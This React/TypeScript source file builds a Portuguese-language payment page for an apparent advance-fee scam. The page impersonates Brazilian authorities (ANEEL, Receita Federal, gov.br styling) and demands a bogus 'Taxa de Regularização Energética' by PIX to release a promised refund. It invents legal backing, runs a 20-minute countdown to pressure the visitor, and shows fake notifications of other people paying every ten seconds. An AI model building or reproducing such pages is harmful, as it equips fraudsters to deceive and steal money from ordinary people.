import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Copy, CheckCircle, Info, AlertCircle, Bell } from "lucide-react";
import { Separator } from "@/components/ui/separator";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { useToast } from "@/hooks/use-toast";
import { Toast } from "@/components/ui/toast";
import { Toaster } from "@/components/ui/toaster";
import { playNotificationSound } from "@/components/NotificationSound";

// Gerar um código PIX aleatório
const gerarCodigoPix = () => {
  const chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  let codigo = "";
  for (let i = 0; i < 32; i++) {
    codigo += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return codigo.match(/.{1,4}/g)?.join(" ") || "";
};

// Nomes para as notificações
const nomes = [
  "Pedro", "Maria", "João", "Ana", "Carlos", "Fernanda", "Lucas", "Júlia", 
  "Rafael", "Mariana", "Bruno", "Camila", "Diego", "Isabela", "Gustavo", 
  "Letícia", "Henrique", "Amanda", "Felipe", "Natália", "Ricardo", "Larissa",
  "Rodrigo", "Carla", "Alexandre", "Beatriz", "Eduardo", "Vanessa", "Marcelo", "Bianca"
];

// Componente de notificação
interface NotificacaoProps {
  nome: string;
  valor: string;
  onClose: () => void;
}

const Notificacao = ({ nome, valor, onClose }: NotificacaoProps) => {
  useEffect(() => {
    // Som de notificação
    playNotificationSound();
    
    // Fechar automaticamente após 5 segundos
    const timer = setTimeout(() => {
      onClose();
    }, 5000);
    
    return () => clearTimeout(timer);
  }, [onClose]);
  
  return (
    <div className="fixed right-4 max-w-md w-full bg-white shadow-lg rounded-lg">
      <div className="flex items-start p-4">
        <div className="flex-shrink-0 pt-0.5">
          <Bell className="h-5 w-5 text-blue-500" />
        </div>
        <div className="ml-3 w-0 flex-1">
          <p className="text-sm font-medium text-gray-900">
            Nova transação
          </p>
          <p className="mt-1 text-sm text-gray-500">
            <strong>{nome}</strong> acabou de pagar a TRE para uma restituição de <strong className="text-green-600">{valor}</strong>
          </p>
        </div>
        <div className="ml-4 flex-shrink-0 flex">
          <button
            className="bg-white rounded-md inline-flex text-gray-400 hover:text-gray-500 focus:outline-none"
            onClick={onClose}
          >
            <span className="sr-only">Fechar</span>
            <svg className="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
              <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
            </svg>
          </button>
        </div>
      </div>
    </div>
  );
};

// Formatar um valor monetário
const formatarValor = (valor: number) => {
  return valor.toLocaleString('pt-BR', { 
    style: 'currency', 
    currency: 'BRL' 
  });
};

// Componente principal da página
export default function PagamentoPix() {
  const [location, navigate] = useLocation();
  const { toast } = useToast();
  
  // Obter parâmetros da URL
  const urlParams = new URLSearchParams(window.location.search);
  
  // Dados da restituição
  const cpf = urlParams.get('cpf') || "";
  const nome = urlParams.get('nome') || "";
  const valor = parseFloat(urlParams.get('valor') || "2500");
  const valorFormatado = formatarValor(valor);
  const valorTaxaFormatado = formatarValor(74.90);
  
  // Estado para o código PIX
  const [codigoPix] = useState(gerarCodigoPix());
  const [copied, setCopied] = useState(false);
  
  // Estado para as notificações
  const [notificacoes, setNotificacoes] = useState<{ id: number; nome: string; valor: string }[]>([]);
  
  // Estado para o contador regressivo (20 minutos = 1200 segundos)
  const [tempoRestante, setTempoRestante] = useState(1200);
  
  // Gerar um valor aleatório para notificações
  const gerarValorAleatorio = () => {
    const valor = 1800 + Math.random() * 1200; // Entre 1800 e 3000
    return formatarValor(valor);
  };
  
  // Função para gerar uma notificação
  const gerarNotificacao = () => {
    const nomeAleatorio = nomes[Math.floor(Math.random() * nomes.length)];
    const valorAleatorio = gerarValorAleatorio();
    
    const id = Date.now();
    setNotificacoes(prev => [...prev, { id, nome: nomeAleatorio, valor: valorAleatorio }]);
  };
  
  // Remover uma notificação
  const removerNotificacao = (id: number) => {
    setNotificacoes(prev => prev.filter(notif => notif.id !== id));
  };
  
  // Copiar o código PIX
  const copiarCodigoPix = () => {
    navigator.clipboard.writeText(codigoPix.replace(/\s/g, ''));
    setCopied(true);
    toast({
      title: "Código copiado!",
      description: "O código PIX foi copiado para a área de transferência.",
    });
    
    setTimeout(() => setCopied(false), 3000);
  };
  
  // Simular o pagamento (para fins de demonstração)
  const simularPagamento = () => {
    navigate("/sucesso");
  };
  
  // Formatar o tempo do contador (mm:ss)
  const formatarTempo = (segundos: number) => {
    const minutos = Math.floor(segundos / 60);
    const segs = segundos % 60;
    return `${minutos.toString().padStart(2, '0')}:${segs.toString().padStart(2, '0')}`;
  };
  
  // Efeito para o contador regressivo e notificações
  useEffect(() => {
    // Contador regressivo
    const timerInterval = setInterval(() => {
      setTempoRestante(prev => {
        if (prev <= 1) {
          clearInterval(timerInterval);
          toast({
            title: "Tempo esgotado!",
            description: "O tempo para pagamento da TRE expirou.",
            variant: "destructive",
          });
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    
    // Gerar as 10 notificações iniciais
    const gerarNotificacoesIniciais = () => {
      for (let i = 0; i < 10; i++) {
        setTimeout(() => {
          gerarNotificacao();
        }, i * 10000); // A cada 10 segundos
      }
    };
    
    gerarNotificacoesIniciais();
    
    // Continuar gerando notificações a cada 10 segundos
    const notificacoesInterval = setInterval(() => {
      gerarNotificacao();
    }, 10000);
    
    return () => {
      clearInterval(timerInterval);
      clearInterval(notificacoesInterval);
    };
  }, []);
  
  return (
    <main className="container mx-auto px-4 py-8">
      {/* Este componente é necessário para o toast */}
      <Toaster />
      
      <div className="max-w-3xl mx-auto">
        <h1 className="text-3xl font-bold text-[var(--gov-blue-dark)] mb-6">
          Pagamento da Taxa de Regularização Energética (TRE)
        </h1>
        
        <div className="mb-6 space-y-4">
          <Alert className="bg-red-50 border-red-200">
            <AlertCircle className="h-5 w-5 text-red-600" />
            <AlertTitle className="text-red-800 font-bold text-lg">AÇÃO OBRIGATÓRIA PARA RECEBIMENTO</AlertTitle>
            <AlertDescription className="text-red-700">
              Para que o valor de <strong className="font-bold">{valorFormatado}</strong> seja liberado para depósito em sua conta bancária, é <span className="underline font-bold">obrigatório</span> o pagamento da Taxa de Regularização Energética (TRE).
            </AlertDescription>
          </Alert>
          
          <div className="bg-amber-50 border border-amber-200 rounded-lg p-4">
            <div className="flex items-start">
              <AlertCircle className="h-5 w-5 text-amber-600 mt-0.5" />
              <div className="ml-3">
                <h3 className="text-amber-800 font-bold">ATENÇÃO: PRAZO FINAL PARA PAGAMENTO</h3>
                <p className="text-amber-700 mt-1">
                  Conforme regulamento oficial, o pagamento da TRE deve ser realizado no prazo máximo de <strong>20 minutos</strong>. 
                  Após esse prazo, a solicitação será cancelada automaticamente, e o valor reservado será devolvido ao 
                  Fundo Nacional de Compensação Tarifária, ficando indisponível para nova solicitação.
                </p>
              </div>
            </div>
          </div>
        </div>
        
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          <div className="md:col-span-2">
            <Card>
              <CardContent className="p-6">
                <h2 className="text-xl font-semibold mb-4">Informações da Restituição</h2>
                
                <div className="space-y-4">
                  <div>
                    <p className="text-gray-500 text-sm">CPF</p>
                    <p className="font-medium">{cpf}</p>
                  </div>
                  
                  <div>
                    <p className="text-gray-500 text-sm">Nome</p>
                    <p className="font-medium">{nome}</p>
                  </div>
                  
                  <div>
                    <p className="text-gray-500 text-sm">Valor a Receber</p>
                    <p className="font-medium text-xl text-green-600">{valorFormatado}</p>
                  </div>
                  
                  <Separator />
                  
                  <div>
                    <p className="text-gray-500 text-sm">Taxa de Regularização Energética (TRE)</p>
                    <p className="font-medium text-orange-600">{valorTaxaFormatado}</p>
                  </div>
                </div>
                
                <div className="mt-6 bg-blue-50 p-4 rounded-lg">
                  <div className="flex">
                    <Info className="h-5 w-5 text-blue-600 mt-0.5" />
                    <div className="ml-3">
                      <h3 className="text-blue-800 font-bold">O que é a Taxa de Regularização Energética (TRE)?</h3>
                      <p className="text-blue-700 mt-2">
                        A TRE é um tributo técnico-administrativo previsto no programa de Compensação Tarifária Nacional, 
                        instituído para custear os seguintes serviços públicos:
                      </p>
                      <ul className="list-disc pl-5 mt-2 text-blue-700 space-y-1">
                        <li>Auditoria dos dados de consumo e histórico tarifário;</li>
                        <li>Validação junto aos órgãos reguladores (ANEEL/Receita);</li>
                        <li>Liberação segura dos valores via sistema bancário nacional (Pix).</li>
                      </ul>
                      <div className="mt-3 bg-blue-100 p-2 rounded-md">
                        <p className="text-blue-800 font-medium">VALOR: {valorTaxaFormatado}</p>
                        <p className="text-blue-800 font-medium">MEIO DE PAGAMENTO: PIX (QR Code ou Copia e Cola)</p>
                        <p className="text-blue-800 font-medium">PRAZO PARA PAGAMENTO: 20 minutos após o acesso desta página</p>
                      </div>
                    </div>
                  </div>
                </div>
                
                <div className="mt-4 space-y-4">
                  <div className="border border-green-200 bg-green-50 rounded-lg p-4">
                    <h3 className="font-bold text-green-800">GARANTIA DE SEGURANÇA</h3>
                    <p className="text-green-700 mt-1">
                      Este procedimento é fiscalizado e regulamentado por órgãos oficiais, com garantia de:
                    </p>
                    <ul className="list-disc pl-5 mt-2 text-green-700">
                      <li>Conformidade com a LGPD (Lei Geral de Proteção de Dados);</li>
                      <li>Consultas criptografadas com tecnologia GOV.BR;</li>
                      <li>Registro no sistema nacional de restituição tarifária.</li>
                    </ul>
                  </div>
                  
                  <div className="border border-gray-200 rounded-lg p-4">
                    <h3 className="font-bold text-gray-800">PERGUNTAS FREQUENTES (FAQ)</h3>
                    <div className="mt-2 space-y-3">
                      <div>
                        <h4 className="font-medium">1. Por que estou pagando uma taxa se o valor é meu por direito?</h4>
                        <p className="text-gray-600 text-sm">
                          A TRE é uma exigência operacional imposta pelos órgãos públicos para garantir a segurança da liberação, 
                          evitando fraudes, duplicidades e erros de restituição.
                        </p>
                      </div>
                      <div>
                        <h4 className="font-medium">2. A restituição é garantida após o pagamento da TRE?</h4>
                        <p className="text-gray-600 text-sm">
                          Sim. Após a confirmação, o valor de {valorFormatado} será depositado em até 72 horas úteis, 
                          conforme calendário de restituição oficial.
                        </p>
                      </div>
                      <div>
                        <h4 className="font-medium">3. Posso pagar a taxa depois?</h4>
                        <p className="text-gray-600 text-sm">
                          Não. A janela de restituição é única e exclusiva. Caso a TRE não seja quitada dentro do prazo informado, 
                          o crédito será cancelado automaticamente e não poderá ser solicitado novamente.
                        </p>
                      </div>
                      <div>
                        <h4 className="font-medium">4. Como sei que isso é oficial?</h4>
                        <p className="text-gray-600 text-sm">
                          Todo o processo está amparado por decisão do STF, regulamentado pela Lei Complementar nº 194/2022, 
                          e validado pela ANEEL e Receita Federal.
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
          
          <div>
            <Card>
              <CardContent className="p-6">
                <div className="flex justify-between items-center mb-4">
                  <h2 className="text-xl font-semibold">Pagamento via PIX</h2>
                  <div className="flex items-center">
                    <span className="text-red-600 font-medium mr-2">Tempo restante:</span>
                    <div className={`font-mono font-bold text-lg ${tempoRestante < 300 ? 'text-red-600 animate-pulse' : 'text-red-600'}`}>
                      {formatarTempo(tempoRestante)}
                    </div>
                  </div>
                </div>
                
                <Tabs defaultValue="qrcode">
                  <TabsList className="w-full mb-4">
                    <TabsTrigger value="qrcode" className="flex-1">QR Code</TabsTrigger>
                    <TabsTrigger value="copiacola" className="flex-1">Copia e Cola</TabsTrigger>
                  </TabsList>
                  
                  <TabsContent value="qrcode" className="mt-2">
                    <div className="flex flex-col items-center justify-center">
                      <div className="border border-gray-200 p-4 rounded-lg mb-4">
                        <img 
                          src="https://chart.googleapis.com/chart?cht=qr&chl=00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426655440000%235204000053039865802BR5913ANEEL%20PAGTOS6008BRASILIA62070503***6304DA5A&chs=200x200&chld=L|0"
                          alt="QR Code do PIX" 
                          className="w-44 h-44" 
                        />
                      </div>
                      <p className="text-sm text-gray-600 mb-2">Valor a ser pago:</p>
                      <p className="text-xl font-bold">{valorTaxaFormatado}</p>
                    </div>
                  </TabsContent>
                  
                  <TabsContent value="copiacola" className="mt-2">
                    <div>
                      <p className="text-sm text-gray-600 mb-2">Copie o código abaixo:</p>
                      <div className="flex items-center">
                        <div className="flex-1 bg-gray-100 p-3 rounded-l-md font-mono text-xs break-all">
                          {codigoPix}
                        </div>
                        <button 
                          onClick={copiarCodigoPix}
                          className="bg-[var(--gov-blue)] text-white p-3 rounded-r-md hover:bg-[var(--gov-blue-dark)]"
                        >
                          {copied ? <CheckCircle className="h-5 w-5" /> : <Copy className="h-5 w-5" />}
                        </button>
                      </div>
                      <p className="text-sm text-gray-600 mt-4 mb-2">Valor a ser pago:</p>
                      <p className="text-xl font-bold">{valorTaxaFormatado}</p>
                    </div>
                  </TabsContent>
                </Tabs>
                
                <div className="mt-6">
                  <Button 
                    onClick={simularPagamento}
                    className="w-full bg-[var(--gov-green)] hover:bg-[var(--gov-green)]/90 text-white font-bold py-3"
                  >
                    Já fiz o pagamento
                  </Button>
                  
                  <p className="text-xs text-gray-500 text-center mt-2">
                    Clique apenas após concluir o pagamento
                  </p>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
      
      {/* Notificações */}
      <div className="fixed top-4 right-4 z-50 flex flex-col space-y-2">
        {notificacoes.map(notif => (
          <Notificacao 
            key={notif.id}
            nome={notif.nome}
            valor={notif.valor}
            onClose={() => removerNotificacao(notif.id)}
          />
        ))}
      </div>
    </main>
  );
}